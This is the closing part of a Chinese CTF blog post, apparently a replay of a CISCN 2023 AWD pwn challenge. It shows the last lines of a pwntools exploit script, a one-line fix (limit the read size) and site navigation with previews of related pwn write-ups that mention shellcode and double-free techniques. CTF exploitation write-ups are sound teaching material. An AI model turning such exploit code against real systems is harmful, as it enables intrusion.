class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">])</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>




<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="fix-3"><span class="me-2">Fix</span><a href="#fix-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>控制 read 的大小即可</li>
</ul>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf/">CTF</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FCISCN-2023-%25E5%258D%258E%25E4%25B8%259C%25E5%258C%2597%25E8%25B5%259B%25E5%258C%25BA-AWDPlus-pwn-%25E9%25A2%2598%25E5%25A4%258D%25E7%258E%25B0%2F&title=CISCN%202023%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%20AWDPlus%20pwn%20%E9%A2%98%E5%A4%8D%E7%8E%B0%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=CISCN%202023%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%20AWDPlus%20pwn%20%E9%A2%98%E5%A4%8D%E7%8E%B0%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FCISCN-2023-%25E5%258D%258E%25E4%25B8%259C%25E5%258C%2597%25E8%25B5%259B%25E5%258C%25BA-AWDPlus-pwn-%25E9%25A2%2598%25E5%25A4%258D%25E7%258E%25B0%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FCISCN-2023-%25E5%258D%258E%25E4%25B8%259C%25E5%258C%2597%25E8%25B5%259B%25E5%258C%25BA-AWDPlus-pwn-%25E9%25A2%2598%25E5%25A4%258D%25E7%258E%25B0%2F&text=CISCN%202023%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%20AWDPlus%20pwn%20%E9%A2%98%E5%A4%8D%E7%8E%B0%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/BRISC-CTF/">2024-BRISC-CTF-Pwn-WriteUps</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/">IrisCTF2025-Pwn-Binary-Exploitation-WriteUps</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/PHP-So-Pwn/">2024-05-31-PHP-So-Pwn</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/GCC-CTF/">2024-03-05-GCC-CTF-Pwn_Writeups</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">文章内容</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">相关文章</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/2023%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF%E6%9A%A8%E9%87%91%E7%A0%96%E5%9B%BD%E5%AE%B6%E6%8A%80%E8%83%BD%E5%8F%91%E5%B1%95%E4%B8%8E%E6%8A%80%E6%9C%AF%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9C%A8%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8-Pwn-WriteUps/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700395200"
  data-df="YYYY/MM/DD"
  
>
  2023/11/19
</time>

              <h4 class="pt-0 my-2">2023一带一路暨金砖国家技能发展与技术创新大赛之网络安全在企业信息管理中的应用-Pwn-WriteUps</h4>
              <div class="text-muted">
                <p>
                  





                  ‍
‍

‍

pwn-pwn0402

‍

​​​​

‍


  我们采用溢出后再次read  然后写shellcode 在栈上ret


‍

​​

‍

​​

from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.s...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/2023%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%86%B3%E8%B5%9BPwn-%E5%88%86%E6%9E%90/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700481600"
  data-df="YYYY/MM/DD"
  
>
  2023/11/20
</time>

              <h4 class="pt-0 my-2">2023香山杯决赛Pwn-分析</h4>
              <div class="text-muted">
                <p>
                  





                  
  进决赛了，但是和金砖的比赛冲突了决赛没时间去了呜呜呜😭😭😭，选择去打金砖了，好打一点。


camera

‍

程序分析

‍

​​

‍

根据程序的功能然后加上一些手法，可以double free

后面就是填满 tcachebins 然后 fastbin double free 就好了

‍

​​

‍

‍

cat 用的顺手了，我就直接用 cat  ORW 就好了

​...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700913600"
  data-df="YYYY/MM/DD"
  
>
  2023/11/25
</time>

              <h4 class="pt-0 my-2">2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups</h4>
              <div class="text-muted">
                <p>
                  





                  ‍

‍
DASCTF X CBCTF 2023｜无畏者先行

‍

‍

Pwn-ASadStory

‍


  保护


​​


  沙箱


​​

‍


  exploit


from pwn import *
s       = lambda data               :io.send(data)
sa      = lambda delim,data     ...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B-%E5%AE%9E%E8%B7%B5%E8%B5%9B-AWDP-Pwn-WriteUps_by_AhiSec/"
      class="btn btn-outline-primary"
      aria-label="上一篇"
    >
      <p>第六届全国网络安全挑战赛青少年专项赛-实践赛-AWDP-Pwn-WriteUps_by_AhiSec</p>
    </a>
  

  
    <a
      href="/posts/Announcements/"
      class="btn btn-outline-primary"
      aria-label="下一篇"
    >
      <p>Announcements</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imLZH1/me_giscus_Discussions-',
      'data-repo-id': 'comments',
      'data-category': 'general',
      'data-category-id': '',
      'data-mapping': 'pathname',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'bottom',
      'data-lang': 'zh-CN',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2025</time>
    <a href="https://user.qzone.qq.com/3461665835">imLZH1</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。"
      >保留部分权利。</span>
    
  </p>
	<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>

  <p>本站采用 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 主题 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">热门标签</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">发现新版本的内容。</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      更新
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    <script src="/assets/lib/jquery/jquery.min.js"></script>
  

  
    <script src="/assets/lib/bootstrap/bootstrap.bundle.min.js"></script>
  

  
    <script src="/assets/lib/simple-jekyll-search/simple-jekyll-search.min.js"></script>
  

  
    <script src="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.umd.min.js"></script>
  

  
    <script src="/assets/lib/magnific-popup/jquery.magnific-popup.min.js"></script>
  

  
    <script src="/assets/lib/clipboard/clipboard.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/dayjs.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/locale/en.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/relativeTime.min.js"></script>
  

  
    <script src="/assets/lib/dayjs/plugin/localizedFormat.min.js"></script>
  

  
    <script src="/assets/lib/tocbot/tocbot.min.js"></script>
  








<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

